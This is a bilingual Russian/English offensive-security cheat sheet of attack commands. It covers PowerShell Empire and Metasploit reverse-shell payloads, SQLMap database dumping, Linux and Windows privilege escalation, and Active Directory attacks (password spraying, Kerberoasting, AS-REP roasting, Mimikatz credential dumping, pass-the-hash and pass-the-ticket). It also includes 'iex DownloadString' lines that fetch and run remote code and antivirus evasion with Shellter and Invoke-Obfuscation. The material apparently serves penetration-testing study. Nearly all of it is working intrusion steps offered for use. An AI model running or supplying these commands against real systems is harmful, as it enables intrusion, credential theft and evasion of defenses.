# 🛠 PowerShell

## 🔹 Проверка архитектуры
```powershell
[Environment]::Is64BitProcess
# True = 64-битный PowerShell
```

## 🔹 Запуск скриптов с обходом ограничений
```powershell
powershell.exe -ExecutionPolicy Bypass .\script.ps1
powershell.exe -ExecutionPolicy Unrestricted .\script.ps1
powershell.exe -NoProfile .\script.ps1
powershell.exe -WindowStyle Hidden .\script.ps1
powershell.exe -Version 2.0
```

## 🔹 Выполнение команд
```powershell
powershell.exe -Command "Get-Process"
powershell.exe -Command "& {Get-Process}"
powershell.exe -EncodedCommand <Base64>
```

---

# 🧠 PowerShell Empire

## 🔹 Основные команды
```bash
powershell-empire server       # Запуск сервера
powershell-empire client       # Запуск клиента
```

## 🔹 Настройка слушателя
```
uselistener http
set Host <Attacker_IP>
set Port <Port>
execute                         # Создание слушателя (как nc -lp)
```

## 🔹 Генерация полезной нагрузки
```
usestager multi/launcher
set Listener http
execute
```

## 🔹 Управление агентами
```
agents                         # Список активных сессий
interact <agentName>          # Взаимодействие с агентом
usemodule <modulePath>        # Выбор модуля
```

---

# 🧩 Полезные модули Empire

| Категория | Модуль | Назначение |
|----------|--------|------------|
| host info | `powershell/situational_awareness/host/computerdetails` | Аналог `sysinfo` |
| network | `powershell/situational_awareness/network/portscan` | Сканер портов |
| payloads | `powershell/code_execution/invoke_metasploitpayload` | Вызывает MSF web_delivery |

---

# 🎯 Metasploit + PowerShell

## Web Delivery:
```
use multi/script/web_delivery
set TARGET 2                    # PowerShell
set PAYLOAD windows/meterpreter/reverse_tcp
run
```

___
___
# 🌐 Web Application Pentesting
## 🛡️ Nikto — Web Server Vulnerability Scanner
```bash
nikto -h TARGET
nikto -h TARGET -o nikto.html -Format html  # HTML отчёт
```

---

## 📁 GoBuster — Файлы и директории
```bash
gobuster dir -u TARGET -w wordlist.txt                         # Стандартный перебор
gobuster dir -u TARGET -w wordlist.txt -b 403,404              # Исключить ответы 403, 404
gobuster dir -u TARGET -w wordlist.txt -x .php,.txt            # Поиск по расширениям
gobuster dir -u TARGET -w wordlist.txt -r                      # Следовать редиректам
```

---

## 🧭 Amass — Subdomain Enumeration
```bash
amass enum -d example.com
amass enum -passive -d example.com
amass enum -passive -d example.com -src -dir ./output
# Показывает источники + сохраняет в каталог
```
🔗 https://github.com/owasp-amass

---

## 🛠 WPScan — WordPress Аудит
```bash
wpscan --url https://example.com
wpscan --url https://example.com --enumerate p --plugins-detection aggressive
wpscan --url https://example.com --enumerate p --plugins-detection aggressive --api-token YOUR_API_KEY
```

---

## 🧪 OWASP ZAP — SQL Injection via Fuzzing
1. Запусти OWASP ZAP → открой браузер через иконку.
2. Перейди на целевой сайт.
3. В секции “Sites” → правый клик по нужному запросу → `Attack → Fuzz`.
4. Удали значение параметра → выдели пустое место → `Add`.
5. Выбери: `File Fuzzers → jbrofuzz → SQL Injection`.
6. Нажми `Add → OK → Start Fuzzer`.
7. Смотри `State` → ищи `Reflected`.

---

## 🐍 SQLMap — Автоматизация SQL-инъекций

### Инъекция через URL/параметры:
```bash
sqlmap -u "http://target.com/index.php?id=1" --data="id=1" -p id --method POST
```

### Использование захваченного запроса:
```bash
sqlmap -r request.txt -p vulnerableParam --technique=E
```

### Получение текущей БД:
```bash
sqlmap -r request.txt -p vulnerableParam --technique=E --current-db
```

### Просмотр таблиц:
```bash
sqlmap -r request.txt -p vulnerableParam --technique=E -D DBNAME --tables
```

### Дамп таблицы:
```bash
sqlmap -r request.txt -p vulnerableParam --technique=E -D DBNAME -T TABLENAME --dump
```

### Текущий пользователь:
```bash
sqlmap -r request.txt -p vulnerableParam --technique=E --current-user
```
___
___
# 🧱 Linux Privilege Escalation

## 📄 File Permissions
```bash
find / -not -type l -perm -o+w
```
🔍 Ищет файлы с правами на запись для всех пользователей.

### Если /etc/shadow доступен для редактирования:
```bash
openssl passwd -1 -salt abc mypassword
# Результат вставить в /etc/shadow с помощью nano:
nano /etc/shadow
```

---

## 🔓 SUID Бинарники
```bash
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
```
🔍 Ищет бинарники с SUID-битом (исполняются от имени владельца, часто root).

---

## 🔑 Проверка sudo на NOPASSWD
```bash
sudo -l
```
📌 Ищи `(root) NOPASSWD:` — можно выполнять команды без пароля.
___
___
# 🔀 Linux Lateral Movement & Pivoting

## 🧩 Pivoting via SSH Tunneling
```bash
ssh user@TARGETIP -D 9050
```
- `9050` — порт для SOCKS4 proxychains (см. `/etc/proxychains.conf`)
- `TARGETIP` — IP-адрес промежуточной (pivot) машины, а не конечной цели

---

## 🌐 Pivoting with reGeorg
- Используется, когда нет высоких привилегий на pivot-машине
- Путь к скрипту: `/root/Desktop/tools/reGeorg/tunnel.php`

### Шаги:
1. Залей `tunnel.php` на pivot-машину.
2. На атакующей машине запусти:
```bash
python reGeorgSocksProxy.py -p 9050 -u http://TARGETIP/PATHTO_TUNNEL.PHP
```
3. Используй `proxychains` для подключения к целевой машине:
```bash
proxychains <command> FINALTARGETIP
```
___
___
# 🪟 Windows Privilege Escalation

## 🔧 PowerUp
```powershell
powershell -ep bypass
. .\PowerUp.ps1
Invoke-PrivescAudit
```

---

## 🔑 Saved Credentials via cmdkey
```cmd
cmdkey /list
runas.exe /savecred /user:founduser cmd
```

---

## 📝 Registry Autoruns
```powershell
Get-Acl -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' | Format-List
# Change an existing key or create a new one pointing to a MSFVenom payload
# It will execute on user login
```

---

## 🥔 Juicy Potato
1. Create MSFVenom payload and upload it to target.
2. Upload `juicypotato.exe` to target.
3. Run:
```cmd
Juicypotato.exe -l 5555 -p PATHTOPAYLOAD -t * -c CLSID
```
📌 [CLSID Reference](https://ohpe.it/juicy-potato/CLSID/)

---

## 🔍 PrivescCheck
```powershell
powershell -ep bypass
. .\PrivescCheck.ps1
Invoke-PrivescCheck
```

---

## 🕵️ PowerShell History
```text
C:\Users\User\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_History.txt
```

---

## 🚦 UACMe
```cmd
Akagi64.exe {KEY/23} {FULL_PATH_MPRETER_PAYLOAD}
```
🗂 Файл `Akagi64.exe` должен быть загружен в `/Desktop/Tools`

---
## 🔗 Источники:
- https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
- https://ohpe.it/juicy-potato/CLSID/
- https://github.com/itm4n/PrivescCheck/blob/master/PrivescCheck.ps1
___
___
# 🔀 Windows Lateral Movement & Pivoting

## 🖥️ Lateral Movement via RDP
1. Проверь файл:
```plaintext
C:\Users\Administrator\Documents\Production-Server.edg
```
2. Загрузить `SharpDPAPI.exe` на целевую машину.
3. Выполнить:
```powershell
SharpDPAPI.exe edg /unprotected
```
4. Если нужен мастер-ключ:
   - Загрузить `kiwi`
   - Выполнить:
```powershell
kiwi_cmd sekurlsa::dpapi
```
   - Скопировать `GUID:SHA1`
   - Выполнить:
```powershell
SharpDPAPI.exe rdg GUID:SHA1
```

---

## 📡 Lateral Movement via PSRemoting
1. На Kali или Linux:
```powershell
pwsh
$cred = Get-Credential
Enter-PSSession –ComputerName TARGETIP -Authentication Negotiate -Credential $cred
```
2. Если PSRemoting отключён:
   - Получить доступ к машине
   - Выполнить в PowerShell:
```powershell
Enable-PSRemoting
```

---

## 🐍 Lateral Movement via WMIEXEC
```bash
wmiexec.py -hashes <NTLM> USER@TARGETIP
```

___
___
## Initial Access

### Password Spraying
```powershell
.\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -UserList .\USERFILE -Password PASS
# Add -Verbose if needed
```

---

##  Enumeration

### BloodHound
```powershell
cd C:\tools\BloodHound\BloodHound\resources\app\Collectors
powershell -ep bypass
.\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All
# Then open the BloodHound app and upload the ZIP
# Default Neo4j creds: user: neo4j | pass: Password@123
```

### PowerView
```powershell
powershell -ep bypass
.\PowerView.ps1

Get-NetUser | Select-Object -Property samaccountname
Get-NetUser -PreauthNotRequired | select samaccountname, useraccountcontrol

Get-Domain
Get-Domain -Domain DOMAINNAME
Get-DomainSID
Get-DomainController
Get-DomainUser
Get-DomainUser -Identity USERNAME
Get-NetComputer
Get-NetGroup -username "USERNAME"
Get-NetGroupMember "GROUPNAME"
Find-DomainShare -ComputerName COMPUTERNAME -verbose
Get-NetShare
Get-NetGPO
Get-NetOU
Get-NetDomainTrust
Get-NetForest
Get-NetForestDomain
```

---

## Privilege Escalation

### AS-REP Roasting
```powershell
powershell -ep bypass
.\PowerView.ps1
Get-Domainuser | Where-Object { $_.UserAccountControl -like "*DONT_REQ_PREAUTH*" }
# Then use samaccountname with:
.\Rubeus.exe asreproast /user:USERNAME /outfile:hash.txt
.\john.exe .\PATH_TO_HASHFILE --format=krb5asrep --wordlist=10k-worst-pass.txt
```

### Kerberoasting
```powershell
powershell -ep bypass
.\PowerView.ps1
Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
setspn -T research -Q */*

# SPN TGT request
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN"

# Export and crack
.\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command 'Kerberos::list /export'
python.exe .\kerberoast-Python3\tgsrepcrack.py .\10k-worst-pass.txt .\TICKETFILE
```

---

## Lateral Movement

### Pass the Hash
```powershell
powershell -ep bypass
.\PowerView.ps1
Get-Domain
Find-LocalAdminAccess
Enter-PSSession PCNAME

# Upload Mimikatz & TokenManipulation via HFS
iex (New-Object Net.WebClient).DownloadString('HFSIP/FileName')

Invoke-TokenManipulation -Enumerate
Invoke-Mimikatz -Command '"privilege::debug" "token:elevate" "sekurlsa::logonpasswords"'

#Invoke-Mimikatz -Command '"privilege::debug"
#"token::elevate" "lsadump::dcsync /domain:research.security.local #/user:administrator@research.security.local"'

# New powershell session
powershell -ep bypass
.\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:domain /ntlm:NTLMHASH /run:powershell.exe"'

Enter-PSSession prod.research.SECURITY.local
```

### Pass the Ticket
```powershell
powershell -ep bypass
.\PowerView.ps1
Get-Domain
Find-LocalAdminAccess
Enter-PSSession PCNAME

# Upload files via HFS
iex (New-Object Net.WebClient).DownloadString('HFSIP/FileName')

Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
Invoke-Mimikatz -Command '"kerberos::ptt TICKET"'

# Check access
ls \\DOMAINCONTROLLERNAME\c$
```


# 🛡️ AV Evasion & Code Obfuscation

---

## 🧨 AV Evasion with Shellter

### Шаги для создания скрытого payload:
```bash
cd /usr/share/windows-resources/shelter
sudo wine shelter.exe
# Внутри Shelter:
A  # Автоматический режим
# Скопируй vncviewer в свою директорию:
cp /usr/share/windows-binaries/vncviewer.exe ~/Desktop/AVBypass/
Y
L
1  # Или нужный индекс
# Введи LHOST и LPORT (твой IP и порт)
```

### Перенос payload на цель:
```bash
cd ~/Desktop/AVBypass
python3 -m http.server 80
```
📌 Метод переноса зависит от ситуации.

### Приём обратной сессии:
```bash
service postgresql start && msfconsole -q
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <AttackerIP>  # тот же, что в payload
set LPORT <AttackerPort>
run
```

---

## 🎭 Code Obfuscation с Invoke-Obfuscation

🔗 GitHub: https://github.com/danielbohannon/Invoke-Obfuscation

### Установка PowerShell на Linux:
```bash
sudo apt-get install powershell -y
pwsh
```

### Импорт модуля:
```powershell
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
```

### Конфигурация обфускации:
```powershell
SET SCRIPTPATH {Path_To_Code}
AST
ALL
1
# Затем вставь обфусцированный код в новый .ps1 файл
```

---

🔗 Полезное:
- [Invoke-Obfuscation GitHub](https://github.com/danielbohannon/Invoke-Obfuscation)
- [Shell Reverse Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#powershell)

#Dictionaries
```
common_corporate_passwords.lst  
seasons.txt  
months.txt  
xato-net-10-million-passwords-1000.txt  
xato-net-10-million-passwords-10000.txt  
rockyou.txt
```
